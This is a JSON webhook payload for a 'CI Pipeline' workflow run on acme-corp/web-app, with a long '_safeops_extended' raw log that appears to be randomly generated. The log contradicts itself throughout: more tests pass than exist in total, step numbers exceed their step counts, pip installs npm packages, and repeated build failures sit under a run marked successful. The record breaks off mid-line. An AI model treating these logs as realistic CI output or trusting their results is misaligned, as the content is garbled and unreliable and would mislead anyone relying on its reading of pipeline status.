{
  "action": "completed",
  "workflow_run": {
    "id": 186,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "78d44f681deb6866fc03909da69bb5b9fd99cbb7",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-28T12:18:08.162312Z",
    "updated_at": "2025-11-28T12:21:09.632922Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: unit_tests ===\nUsing Python 3.11\nPOST /data - 202 (65ms)\nWaiting...\nCache restored successfully (405MB)\nInstalling lodash@2.20.1\nCache invalidated: dependencies\nPushing to registry...\nCache invalidated: build\n[12:18:08] WARN: Deprecated API usage\n  PASS: e2e/test_api_health.spec.js\nInstalling express@1.20.4\n  PASS: unit/test_auth_login.spec.js\npip install: Successfully installed jest-2.11\nChecking out develop branch\nRan 149 tests in 50s\nSuccess!\nyarn add: Done in 24.41s\nDone.\n\u2713 package completed\n[12:18:08] DEBUG: Memory usage: 930MB\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLayer 2/14: COPY command\nFinished.\nUsing Python 3.9\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:08] INFO: Request completed\npip: Downloading jest-4.20.tar.gz\npip: Collecting prettier\nTransforming 834 files...\nLoading...\nConnecting to example.com:443...\npip: Downloading lodash-1.16.tar.gz\nChecking out master branch\nSwitched to branch 'hotfix/task-328'\nRan 157 tests in 3s\nCompiling src/service.java...\nFinished.\nSwitched to branch 'bugfix/task-599'\nWARNING: prettier has known vulnerabilities\nnpm install: resolved 1958 packages\nOptimizing 96 modules...\nTests: 473 passed, 485 total\nCompiling utils/utils.go...\nCompiling lib/app.ts...\n[12:18:08] ERROR: Connection failed\nyarn add: Done in 19.58s\npip: Collecting axios\npip install: Successfully installed eslint-3.15\nTLS handshake completed\n[12:18:08] INFO: Request completed\nStep 18/24: Building\nnpm install: added 406 packages\nStep 19/20: Building\nProcessing...\nReady.\nnpm install: added 92 packages\n[12:18:08] DEBUG: Query executed in 54ms\n[12:18:08] DEBUG: Connection pool: 10 active\n  PASS: e2e/test_db_connect.spec.js\npip: Installing build dependencies...\npip: Downloading prettier-3.13.tar.gz\n[12:18:08] INFO: Connecting to database\nArtifact downloaded: 13MB\nVerifying...\nBuilding Docker image...\nArtifact uploaded: dist.zip (73MB)\npip: Downloading axios-4.11.tar.gz\nArtifact uploaded: build.tar.gz (37MB)\n[12:18:08] DEBUG: Query executed in 58ms\nyarn add: Done in 10.22s\n\u2713 All checks passed\nLoading...\n[12:18:08] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: added 170 packages\nStep 19/25: Deploying\nnpm notice: created a lockfile\nPulling image: node:3.11\nPOST /data - 201 (336ms)\nPulling image: node:latest\nLayer 7/14: COPY command\nConnecting to acme.corp:443...\npip install: Successfully installed axios-3.12\nTransforming 938 files...\n[12:18:08] INFO: Connecting to database\nCompiling src/handler.rs...\nStep 3/15: Deploying\nSwitched to branch 'feature/task-716'\nInstalling prettier@1.19.9\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: e2e/test_cache_hit.spec.js\nyarn add: Done in 25.41s\nFetching submodules...\nVerifying...\n[12:18:08] INFO: Processing request\nChecking out master branch\nSnapshots: 12 passed, 29 total\nCache saved successfully\nCompiling components/handler.rs...\nWaiting...\n[12:18:08] DEBUG: Query executed in 40ms\nNODE_ENV=development\nStep 8/20: Deploying\nCache hit for key-7468\nProcessing...\nChecking out develop branch\nGET /status - 200 (69ms)\nCreating production build...\npip: Installing build dependencies...\n[12:18:08] INFO: Request completed\n  PASS: test_db_connect (13ms)\n[12:18:08] ERROR: Connection failed\nArtifact downloaded: 6MB\nCache restored successfully (419MB)\n[12:18:08] WARN: Deprecated API usage\nArtifact downloaded: 28MB\nRan 183 tests in 54s\n\u2713 deploy completed\nHEAD is now at 0fe430b\nNODE_ENV=test\n[12:18:08] INFO: Starting build process\nTest Suites: 27 passed, 26 total\nTLS handshake completed\nCache hit for key-1911\nSnapshots: 17 passed, 6 total\nChecking out develop branch\nPushing to registry...\nWARNING: eslint has known vulnerabilities\nStep 20/24: Building\nPulling image: alpine:18\nCompiling lib/app.ts...\n[12:18:08] DEBUG: Loading configuration\nCompleted.\nUploading artifact 'dist' (19 files)\n[12:18:08] INFO: Connecting to database\nTest Suites: 44 passed, 36 total\n[12:18:08] WARN: Deprecated API usage\nInstalling lodash@5.4.10\n[12:18:08] DEBUG: Query executed in 19ms\n[12:18:08] WARN: Deprecated API usage\nRan 135 tests in 40s\n[12:18:08] INFO: Request completed\nTime: 5.970s\nUsing Node.js 18.9.10\nWARNING: lodash has known vulnerabilities\nGET /status - 204 (66ms)\nCoverage: 92% statements, 68% branches\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_db_connect (483ms)\npip install: Successfully installed lodash-5.20\nHEAD is now at 8e52854\nOptimizing 34 modules...\nOK\nnpm notice: created a lockfile\nStep 1/22: Deploying\nnpm notice: created a lockfile\nStep 2/19: Installing dependencies\n[12:18:08] WARN: Deprecated API usage\n[12:18:08] ERROR: Connection failed\nUsing Node.js 16.13.9\n[12:18:08] DEBUG: Query executed in 58ms\n[12:18:08] DEBUG: Query executed in 76ms\nWARNING: prettier has known vulnerabilities\nCompleted.\n\u2713 All checks passed\nDone.\nMinifying vendor.js\nConnection established\nWaiting...\nPulling image: python:latest\n[12:18:08] INFO: Cache refreshed\n[12:18:08] INFO: Request completed\n[12:18:08] DEBUG: Initializing service\nCompiling src/main.py...\nWARNING: prettier has known vulnerabilities\n[12:18:08] DEBUG: Memory usage: 673MB\nVerifying...\nGenerating source maps...\nnpm notice: package.json updated\nOptimizing 97 modules...\nTest Suites: 44 passed, 27 total\n[12:18:08] DEBUG: Memory usage: 571MB\nCompiling utils/app.ts...\nDone.\nTime: 15.198s\nStep 10/16: Testing\nVerifying...\n[12:18:08] DEBUG: Query executed in 51ms\nCache invalidated: dependencies\nCreating production build...\nUploading artifact 'coverage' (39 files)\n[12:18:08] WARN: Deprecated API usage\n=== Step unit_tests completed ===\n=== Step: restore_cache ===\n[12:18:08] WARN: Deprecated API usage\nFinished.\nUploading artifact 'coverage' (1 files)\nCache invalidated: dependencies\nMinifying app.js\nStep 6/21: Building\nStep 20/18: Building\nArtifact downloaded: 15MB\nReady.\nFAILED: test_api_health\nWARNING: eslint has known vulnerabilities\n[12:18:08] INFO: Starting build process\nMinifying app.js\n[12:18:08] INFO: Connecting to database\n\u2713 All checks passed\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Downloading eslint-4.1.tar.gz\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/main.py...\nCache hit for key-6617\n\u2713 Step 'build' succeeded\nPlatform: win32-x64\nArtifact uploaded: build.tar.gz (48MB)\nTime: 106.817s\nArtifact uploaded: build.tar.gz (3MB)\n[12:18:08] INFO: Connecting to database\nnpm notice: created a lockfile\n  PASS: unit/test_user_create.spec.js\nFAILED: test_db_connect\nStep 2/22: Building\nArtifact uploaded: dist.zip (25MB)\nInstalling lodash@5.18.4\nProcessing...\nnpm install: resolved 274 packages\nLayer 8/10: RUN command\n[12:18:08] WARN: Deprecated API usage\nGET /api - 204 (88ms)\nOptimizing 21 modules...\nLoading...\n[12:18:08] DEBUG: Initializing service\nCompiling utils/handler.rs...\nCache invalidated: build\n[12:18:08] DEBUG: Connection pool: 17 active\nStep 12/20: Running migrations\nChecking out develop branch\n[12:18:08] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:08] INFO: Starting build process\nStep 2/22: Installing dependencies\nArtifact uploaded: build.tar.gz (11MB)\npip: Installing build dependencies...\nArtifact uploaded: build.tar.gz (18MB)\nWARNING: lodash has known vulnerabilities\n[12:18:08] DEBUG: Connection pool: 4 active\nEnvironment: staging\n  PASS: test_auth_login (40ms)\n\u2717 build failed with exit code 23\nUsing Python 3.12\nGenerating source maps...\n[12:18:08] DEBUG: Initializing service\nBuilding Docker image...\nCreating production build...\nGenerating source maps...\nStep 13/21: Deploying\n[12:18:08] INFO: Connecting to database\nnpm install: added 250 packages\nStep 11/22: Installing dependencies\nArtifact uploaded: dist.zip (66MB)\nTests: 106 passed, 385 total\nVerifying...\n\u2713 Step 'checkout' succeeded\nStep 1/22: Testing\nHEAD is now at d41a15a\n[12:18:08] WARN: Deprecated API usage\nCompleted.\nFetching submodules...\npip: Downloading webpack-1.6.tar.gz\nArtifact downloaded: 3MB\nMinifying vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Python 3.10\n\u2713 deploy completed\nWARNING: webpack has known vulnerabilities\npip: Downloading express-5.0.tar.gz\nProcessing...\nCreating production build...\n\u2713 Task completed in 3429ms\nProcessing...\nPlatform: darwin-arm64\npip install: Successfully installed axios-2.12\nInstalling eslint@4.3.5\nyarn add: Done in 5.8s\nEnvironment: development\nLayer 5/14: COPY command\nWARNING: prettier has known vulnerabilities\nFetching submodules...\nTime: 107.83s\nFAILED: test_auth_login\nBundling vendor.css\nGET /health - 204 (55ms)\n[12:18:08] INFO: Request completed\nEnvironment: staging\nCreating production build...\nArtifact uploaded: build.tar.gz (17MB)\n[12:18:08] INFO: Cache refreshed\nUsing Node.js 17.6.8\n  PASS: integration/test_cache_hit.spec.js\nFinished.\nOptimizing 31 modules...\nLoading...\n\u2713 Step 'test' succeeded\nCache saved successfully\nyarn add: Done in 26.41s\nLoading...\nFetching submodules...\nProcessing...\n  PASS: unit/test_db_connect.spec.js\nUsing Python 3.10\nPOST /data - 200 (382ms)\nUsing Node.js 20.8.2\nProcessing...\nInstalling express@1.19.5\nCompiling src/main.py...\nCache saved successfully\nArtifact uploaded: build.tar.gz (7MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSnapshots: 31 passed, 40 total\nArtifact uploaded: dist.zip (21MB)\nEnvironment: development\nTLS handshake completed\nCoverage: 99% statements, 99% branches\nPushing to registry...\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGenerating source maps...\nPulling image: node:latest\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 Task completed in 2812ms\n[12:18:08] ERROR: Connection failed\nyarn add: Done in 25.33s\nCreating production build...\n\u2717 build failed with exit code 116\nStep 16/24: Installing dependencies\nBundling main.js\nWARNING: lodash has known vulnerabilities\nSuccess!\n[12:18:08] DEBUG: Query executed in 69ms\n[12:18:08] ERROR: Connection failed\n[12:18:08] INFO: Processing request\nInstalling express@2.11.7\npip: Collecting prettier\n[12:18:08] INFO: Processing request\nCompiling components/handler.rs...\nUsing Python 3.12\n[12:18:08] INFO: Connecting to database\nConnecting to cloud.services:443...\nConnection established\nCompiling components/service.java...\n[12:18:08] INFO: Starting build process\nProcessing...\n[12:18:08] WARN: Deprecated API usage\nOptimizing 94 modules...\nPulling image: node:latest\n\u2713 deploy completed\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed react-5.8\nyarn add: Done in 28.18s\nUploading artifact 'dist' (34 files)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-3586\nUsing Python 3.11\nDone.\nWaiting...\nInstalling axios@1.2.2\nOK\n[12:18:08] ERROR: Connection failed\nAlready up to date.\n[12:18:08] INFO: Processing request\nPlatform: win32-x64\nImage pulled successfully\nCache hit for key-3198\nCompiling components/app.ts...\n[12:18:08] WARN: Deprecated API usage\nImage pulled successfully\nConnecting to test.io:443...\nFinished.\nPulling image: node:18\nStep 8/19: Deploying\nLoading...\n\u2713 Step 'setup' succeeded\n=== Step restore_cache completed ===\n=== Step: deploy_production ===\nnpm install: resolved 1663 packages\n[12:18:08] DEBUG: Query executed in 57ms\nCache invalidated: node_modules\npip: Downloading webpack-2.3.tar.gz\nGenerating source maps...\n[12:18:08] DEBUG: Query executed in 60ms\npip: Downloading jest-3.4.tar.gz\nBuilding Docker image...\nTests: 273 passed, 151 total\nOptimizing 97 modules...\nWARNING: lodash has known vulnerabilities\nReady.\nCompleted.\n[12:18:08] DEBUG: Connection pool: 2 active\nMinifying app.js\nStep 19/24: Testing\nGET /health - 200 (52ms)\n[12:18:08] DEBUG: Query executed in 58ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:08] DEBUG: Connection pool: 1 active\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 15 modules...\nMinifying app.js\nnpm notice: created a lockfile\nFAILED: test_db_connect\n[12:18:08] DEBUG: Memory usage: 1639MB\npip: Downloading jest-5.6.tar.gz\n  PASS: test_api_health (130ms)\nCreating production build...\nTime: 12.131s\nVerifying...\n[12:18:08] INFO: Processing request\nWaiting...\nCache hit for key-9465\nNODE_ENV=production\npip: Collecting express\nWARNING: react has known vulnerabilities\n[12:18:08] INFO: Processing request\nConnecting to test.io:443...\n[12:18:08] INFO: Request completed\nTests: 403 passed, 355 total\nCache restored successfully (440MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Task completed in 4841ms\nStep 12/23: Running migrations\nnpm notice: created a lockfile\nTests: 312 passed, 465 total\nTLS handshake completed\nTests: 350 passed, 439 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:08] DEBUG: Query executed in 59ms\nStep 16/17: Installing dependencies\nRan 120 tests in 48s\nHEAD is now at a5e4b6b\n\u2713 Step 'checkout' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:08] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching submodules...\nCache saved successfully\nCache restored successfully (114MB)\nRan 32 tests in 25s\nnpm install: added 438 packages\n\u2713 All checks passed\nProcessing...\n[12:18:08] INFO: Cache refreshed\nTime: 49.126s\nCache miss for key-8591\nOK\n[12:18:08] DEBUG: Memory usage: 1868MB\nGET /status - 204 (18ms)\nStep 12/22: Deploying\nTime: 2.141s\n[12:18:08] DEBUG: Memory usage: 682MB\nUsing Python 3.10\nGenerating source maps...\nUsing Node.js 20.14.1\nCompleted.\nArtifact uploaded: dist.zip (81MB)\nHEAD is now at f942233\nnpm install: resolved 159 packages\nnpm install: added 351 packages\nConnecting to example.com:443...\nChecking out main branch\nFetching submodules...\npip install: Successfully installed prettier-2.11\n\u2713 Task completed in 4154ms\nUploading artifact 'build' (15 files)\nLoading...\nStep 5/18: Building\nTLS handshake completed\nEnvironment: production\n  PASS: unit/test_auth_login.spec.js\n[12:18:08] INFO: Processing request\n[12:18:08] WARN: Deprecated API usage\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\nTransforming 252 files...\n\u2713 Step 'test' succeeded\nMinifying vendor.js\nTest Suites: 48 passed, 20 total\nGenerating source maps...\nSuccess!\nTLS handshake completed\n[12:18:08] DEBUG: Memory usage: 366MB\nStep 8/24: Testing\nFetching submodules...\nLoading...\nFinished.\n\u2713 Step 'checkout' succeeded\n  PASS: unit/test_user_create.spec.js\n[12:18:08] INFO: Request completed\nOK\n  PASS: unit/test_db_connect.spec.js\n[12:18:08] WARN: Deprecated API usage\nFetching submodules...\n[12:18:08] INFO: Starting build process\nCache miss for key-3436\nException: RuntimeError\n[12:18:08] DEBUG: Loading configuration\n[12:18:08] DEBUG: Loading configuration\nFetching submodules...\n[12:18:08] INFO: Cache refreshed\n\u2713 All checks passed\n[12:18:08] DEBUG: Query executed in 81ms\n[12:18:08] INFO: Cache refreshed\n[12:18:08] INFO: Connecting to database\nCache hit for key-5653\nTransforming 625 files...\nInstalling axios@2.17.2\nCompiling utils/app.ts...\nTransforming 308 files...\nArtifact uploaded: build.tar.gz (41MB)\nAlready up to date.\nTLS handshake completed\nWARNING: express has known vulnerabilities\nTest Suites: 31 passed, 46 total\nFinished.\nCache restored successfully (215MB)\nCompiling components/app.ts...\nPlatform: linux-x64\nPlatform: linux-x64\nCompiling components/app.ts...\nLayer 8/11: COPY command\nStep 13/16: Deploying\nSnapshots: 13 passed, 50 total\nCache invalidated: build\n[12:18:08] INFO: Cache refreshed\n[12:18:08] INFO: Processing request\n[12:18:08] WARN: Deprecated API usage\nLayer 10/14: COPY command\nVerifying...\n[12:18:08] DEBUG: Initializing service\nSwitched to branch 'feature/task-325'\n[12:18:08] DEBUG: Connection pool: 5 active\n[12:18:08] WARN: Deprecated API usage\nAlready up to date.\nCoverage: 97% statements, 75% branches\nNODE_ENV=production\nPlatform: darwin-arm64\nCache invalidated: node_modules\nStep 14/25: Running migrations\n[12:18:08] WARN: Deprecated API usage\nAlready up to date.\nNODE_ENV=production\n  PASS: unit/test_cache_hit.spec.js\nCache invalidated: node_modules\nnpm notice: package.json updated\n  PASS: e2e/test_auth_login.spec.js\nUsing Node.js 18.14.7\nWaiting...\nUsing Node.js 17.6.7\nnpm install: added 167 packages\nStep 10/17: Deploying\n[12:18:08] INFO: Request completed\n[12:18:08] INFO: Processing request\nPlatform: darwin-arm64\npip install: Successfully installed express-5.15\nStep 10/19: Running migrations\nCache invalidated: build\nyarn add: Done in 13.54s\npip install: Successfully installed jest-5.9\nStep 9/23: Deploying\nException: TypeError\nStep 17/17: Linting\n[12:18:08] INFO: Connecting to database\n  PASS: e2e/test_cache_hit.spec.js\npip: Downloading react-3.7.tar.gz\nPulling image: node:latest\nnpm install: resolved 323 packages\nWARNING: react has known vulnerabilities\n\u2713 All checks passed\n=== Step deploy_production completed ===\n=== Step: deploy_staging ===\n[12:18:08] DEBUG: Memory usage: 1521MB\n  PASS: test_user_create (185ms)\n\u2713 Task completed in 3803ms\nCache miss for key-4415\n  PASS: test_api_health (381ms)\n[12:18:08] WARN: Deprecated API usage\n[12:18:08] DEBUG: Initializing service\nOK\n[12:18:08] DEBUG: Loading configuration\nWARNING: eslint has known vulnerabilities\nCompiling components/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Downloading jest-2.5.tar.gz\nUsing Node.js 15.16.3\nArtifact uploaded: dist.zip (35MB)\n[12:18:08] WARN: Deprecated API usage\nCache saved successfully\nTests: 165 passed, 417 total\nDone.\nTransforming 890 files...\n\u2717 build failed with exit code 42\nyarn add: Done in 10.32s\nLoading...\n[12:18:08] DEBUG: Query executed in 63ms\nHEAD is now at 5bea4ce\n[12:18:08] DEBUG: Query executed in 60ms\n  PASS: e2e/test_cache_hit.spec.js\nOK\nCoverage: 93% statements, 82% branches\nInstalling express@3.13.5\nSnapshots: 19 passed, 18 total\nArtifact uploaded: build.tar.gz (28MB)\n[12:18:08] DEBUG: Memory usage: 1662MB\nCache invalidated: build\nConnection established\n[12:18:08] INFO: Starting build process\nChecking out master branch\nyarn add: Done in 29.14s\nPlatform: linux-x64\nReady.\npip: Collecting webpack\n[12:18:08] DEBUG: Query executed in 32ms\nOK\nCache hit for key-1678\n[12:18:08] INFO: Cache refreshed\nEnvironment: production\nFAILED: test_user_create\nStep 3/15: Building\nChecking out main branch\nnpm install: resolved 1226 packages\nChecking out main branch\nChecking out main branch\nCache invalidated: node_modules\nChecking out master branch\nChecking out main branch\n[12:18:08] INFO: Starting build process\nTime: 24.902s\nStep 13/24: Testing\nStep 11/18: Deploying\n[12:18:08] WARN: Deprecated API usage\n[12:18:08] DEBUG: Query executed in 80ms\nWaiting...\nnpm install: resolved 1612 packages\npip: Downloading jest-4.16.tar.gz\nCompiling components/service.java...\nPulling image: python:3.11\n\u2713 All checks passed\nCompiling utils/handler.rs...\nChecking out develop branch\nArtifact uploaded: build.tar.gz (29MB)\nUsing Node.js 14.16.10\nCompleted.\nStep 16/16: Building\nSwitched to branch 'bugfix/task-410'\nCache invalidated: build\nNODE_ENV=development\n\u2713 All checks passed\nWARNING: axios has known vulnerabilities\nStep 12/25: Running migrations\n[12:18:08] DEBUG: Initializing service\nPulling image: node:3.11\n[12:18:08] ERROR: Connection failed\n\u2713 Task completed in 3044ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSwitched to branch 'feature/task-605'\n[12:18:08] WARN: Deprecated API usage\nCache restored successfully (134MB)\nException: TypeError\n[12:18:08] INFO: Request completed\nPlatform: linux-x64\nStep 8/20: Testing\nImage pulled successfully\nPlatform: darwin-arm64\nCompiling components/handler.rs...\nFinished.\nTime: 27.130s\n[12:18:08] ERROR: Connection failed\n\u2717 build failed with exit code 19\nGET /status - 201 (38ms)\nLoading...\nUsing Node.js 17.0.9\nPushing to registry...\nnpm notice: package.json updated\n[12:18:08] INFO: Request completed\nStep 5/21: Building\n[12:18:08] INFO: Processing request\nnpm install: resolved 1501 packages\n[12:18:08] DEBUG: Connection pool: 2 active\nyarn add: Done in 26.68s\nGenerating source maps...\nUsing Node.js 20.11.8\n[12:18:08] DEBUG: Query executed in 100ms\nnpm notice: created a lockfile\nPlatform: linux-x64\nVerifying...\n[12:18:08] WARN: Deprecated API usage\nReady.\nLoading...\nProcessing...\nLoading...\nCache miss for key-7293\nyarn add: Done in 20.23s\nSwitched to branch 'bugfix/task-765'\nFinished.\n[12:18:08] INFO: Connecting to database\nUsing Node.js 15.7.1\npip install: Successfully installed eslint-1.15\nNODE_ENV=test\nNODE_ENV=development\nArtifact uploaded: build.tar.gz (46MB)\nOptimizing 31 modules...\n[12:18:08] DEBUG: Loading configuration\nTransforming 197 files...\nStep 14/15: Deploying\nCompiling lib/handler.rs...\nMinifying main.js\n[12:18:08] DEBUG: Initializing service\nCompleted.\nFinished.\nChecking out main branch\nStep 18/23: Installing dependencies\nPOST /data - 202 (41ms)\n[12:18:08] INFO: Connecting to database\nRan 75 tests in 52s\nRan 155 tests in 35s\nOptimizing 53 modules...\n[12:18:08] INFO: Connecting to database\nnpm install: added 227 packages\npip install: Successfully installed prettier-5.12\n\u2713 All checks passed\nnpm notice: package.json updated\nAlready up to date.\nPlatform: darwin-arm64\n[12:18:08] INFO: Connecting to database\n\u2713 All checks passed\n[12:18:08] INFO: Request completed\nnpm install: added 475 packages\nSuccess!\nUsing Python 3.9\nLayer 8/13: ENV command\n[12:18:08] DEBUG: Connection pool: 13 active\nFinished.\n[12:18:08] ERROR: Connection failed\n  PASS: e2e/test_api_health.spec.js\n\u2713 Task completed in 745ms\n[12:18:08] INFO: Connecting to database\n  PASS: test_auth_login (398ms)\nUploading artifact 'dist' (1 files)\nUploading artifact 'build' (26 files)\nStep 6/16: Installing dependencies\nProcessing...\nCompleted.\nPulling image: node:3.11\nCache saved successfully\nCompiling utils/app.ts...\nStep 6/15: Building\n[12:18:08] WARN: Deprecated API usage\nPlatform: darwin-arm64\nPlatform: win32-x64\n\u2713 Task completed in 574ms\nTests: 161 passed, 196 total\nLoading...\n\u2713 Task completed in 3833ms\nImage pulled successfully\nStep 8/18: Installing dependencies\nCompiling lib/service.java...\nNODE_ENV=test\nStep 18/19: Testing\nCoverage: 74% statements, 74% branches\nDone.\n[12:18:08] INFO: Processing request\nBuilding Docker image...\n[12:18:08] INFO: Starting build process\nLoading...\n=== Step deploy_staging completed ===\n=== Step: build ===\nUsing Node.js 20.14.10\nTest Suites: 35 passed, 44 total\npip: Installing build dependencies...\nCompiling src/main.py...\nCoverage: 83% statements, 71% branches\n\u2713 deploy completed\n\u2713 Task completed in 1318ms\n[12:18:08] WARN: Deprecated API usage\nCompiling lib/main.py...\nFAILED: test_auth_login\nFetching submodules...\n[12:18:08] WARN: Deprecated API usage\n\u2713 Task completed in 3430ms\nCompleted.\nStep 6/23: Linting\n[12:18:08] INFO: Processing request\nStep 19/25: Deploying\nEnvironment: production\nFetching submodules...\n[12:18:08] INFO: Processing request\n\u2713 build completed\nPushing to registry...\nHEAD is now at cea2bee\nSnapshots: 50 passed, 41 total\nSuccess!\nStep 18/23: Running migrations\nStep 10/15: Linting\nyarn add: Done in 17.64s\n[12:18:08] DEBUG: Initializing service\nTests: 442 passed, 307 total\n[12:18:08] DEBUG: Query executed in 12ms\nWARNING: webpack has known vulnerabilities\nChecking out develop branch\nyarn add: Done in 1.35s\n[12:18:08] DEBUG: Query executed in 11ms\nGET /health - 200 (98ms)\nArtifact downloaded: 10MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:08] DEBUG: Memory usage: 1482MB\n[12:18:08] DEBUG: Loading configuration\nTransforming 692 files...\nCompiling utils/app.ts...\nStep 17/18: Deploying\nTest Suites: 47 passed, 45 total\nFAILED: test_db_connect\nStep 14/24: Linting\n[12:18:08] DEBUG: Initializing service\nCompiling src/service.java...\nWARNING: axios has known vulnerabilities\nWARNING: prettier has known vulnerabilities\nPOST /data - 201 (441ms)\nStep 18/20: Running migrations\nNODE_ENV=test\nCache hit for key-3739\n[12:18:08] ERROR: Connection failed\n\u2713 test completed\nCompiling lib/utils.go...\nWaiting...\nInstalling jest@1.1.9\n\u2713 All checks passed\nStep 17/19: Building\nPOST /upload - 201 (236ms)\nArtifact uploaded: dist.zip (20MB)\npip: Downloading jest-5.9.tar.gz\n[12:18:08] DEBUG: Connection pool: 19 active\nWaiting...\n[12:18:08] INFO: Cache refreshed\nCompiling src/service.java...\nStep 14/20: Installing dependencies\nOptimizing 32 modules...\nSnapshots: 33 passed, 29 total\nGET /status - 201 (90ms)\nChecking out main branch\nCache invalidated: dependencies\n[12:18:08] WARN: Deprecated API usage\nCompleted.\nyarn add: Done in 19.3s\nFinished.\n[12:18:08] DEBUG: Memory usage: 1546MB\nCoverage: 98% statements, 88% branches\nStep 9/22: Running migrations\nFinished.\nArtifact uploaded: build.tar.gz (17MB)\nTime: 74.299s\nTests: 296 passed, 330 total\nFetching submodules...\n[12:18:08] INFO: Request completed\n[12:18:08] DEBUG: Initializing service\nVerifying...\n[12:18:08] INFO: Starting build process\nStep 15/22: Deploying\n[12:18:08] INFO: Connecting to database\nStep 4/23: Deploying\nImage pulled successfully\nStep 13/20: Running migrations\nException: ValueError\nCompiling src/index.js...\n[12:18:08] INFO: Starting build process\nBundling runtime.css\nCache miss for key-5285\nUsing Python 3.10\nUsing Python 3.10\nTime: 67.444s\nImage pulled successfully\nWARNING: react has known vulnerabilities\nLayer 3/10: COPY command\nReady.\nyarn add: Done in 9.44s\nConnection established\nStep 2/15: Installing dependencies\nnpm notice: package.json updated\nnpm install: resolved 828 packages\n[12:18:08] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPOST /api - 201 (241ms)\nHEAD is now at 1bdf22d\nPushing to registry...\n[12:18:08] WARN: Deprecated API usage\nEnvironment: test\nnpm install: added 448 packages\nAlready up to date.\nSnapshots: 29 passed, 48 total\nChecking out main branch\nUploading artifact 'build' (29 files)\nBundling styles.js\nPOST /api - 201 (14ms)\npip: Collecting lodash\nLoading...\nWaiting...\nAlready up to date.\nConnecting to cloud.services:443...\n[12:18:08] WARN: Deprecated API usage\n[12:18:08] INFO: Connecting to database\nHEAD is now at 2fe4b2b\nFinished.\nImage pulled successfully\n\u2717 build failed with exit code 25\nTLS handshake completed\nOptimizing 75 modules...\nWARNING: webpack has known vulnerabilities\nCache invalidated: dependencies\nConnecting to acme.corp:443...\n  PASS: test_user_create (96ms)\nPushing to registry...\nException: TypeError\nInstalling axios@4.0.7\n  PASS: test_api_health (433ms)\n[12:18:08] ERROR: Connection failed\npip: Downloading jest-3.18.tar.gz\npip install: Successfully installed webpack-4.7\nBuilding Docker image...\nUsing Python 3.9\nStep 9/18: Installing dependencies\nImage pulled successfully\nVerifying...\nPOST /upload - 201 (26ms)\nConnecting to acme.corp:443...\nMinifying main.js\npip: Downloading eslint-3.9.tar.gz\n[12:18:08] ERROR: Connection failed\nUsing Python 3.11\nImage pulled successfully\n  PASS: test_db_connect (130ms)\n  PASS: test_cache_hit (255ms)\n[12:18:08] WARN: Deprecated API usage\nTest Suites: 13 passed, 46 total\nStep 20/16: Deploying\npip: Installing build dependencies...\nStep 9/19: Running migrations\nNODE_ENV=development\nBuilding Docker image...\nMinifying vendor.js\nConnecting to example.com:443...\nArtifact downloaded: 7MB\n[12:18:08] DEBUG: Memory usage: 1765MB\nCompleted.\nBuilding Docker image...\n\u2713 All checks passed\nFinished.\n[12:18:08] INFO: Cache refreshed\nOK\nConnecting to test.io:443...\nStep 12/16: Deploying\n[12:18:08] WARN: Deprecated API usage\npip: Downloading lodash-1.0.tar.gz\nCreating production build...\nCache restored successfully (469MB)\nSuccess!\n\u2713 deploy completed\nUploading artifact 'build' (50 files)\nRan 142 tests in 35s\nConnection established\nPOST /data - 200 (35ms)\nSnapshots: 3 passed, 28 total\n=== Step build completed ===\n=== Step: e2e_tests ===\npip: Downloading lodash-4.6.tar.gz\nConnection established\n[12:18:08] INFO: Cache refreshed\nCompleted.\nOptimizing 31 modules...\n[12:18:08] INFO: Cache refreshed\n[12:18:08] WARN: Deprecated API usage\nStep 9/21: Linting\nCache restored successfully (168MB)\nArtifact uploaded: dist.zip (92MB)\n[12:18:08] INFO: Processing request\nArtifact downloaded: 43MB\nCache miss for key-9456\nCompiling lib/index.js...\nCompiling lib/index.js...\nNODE_ENV=production\nUsing Python 3.12\nLoading...\nTime: 75.689s\nCache invalidated: build\nTransforming 940 files...\nTLS handshake completed\nArtifact uploaded: build.tar.gz (32MB)\nStep 17/18: Building\nAlready up to date.\nStep 20/17: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:08] INFO: Request completed\nWaiting...\nStep 5/25: Deploying\n\u2717 build failed with exit code 105\nCompiling components/main.py...\nWARNING: axios has known vulnerabilities\nyarn add: Done in 12.55s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nPushing to registry...\npip: Downloading react-5.7.tar.gz\n[12:18:08] INFO: Processing 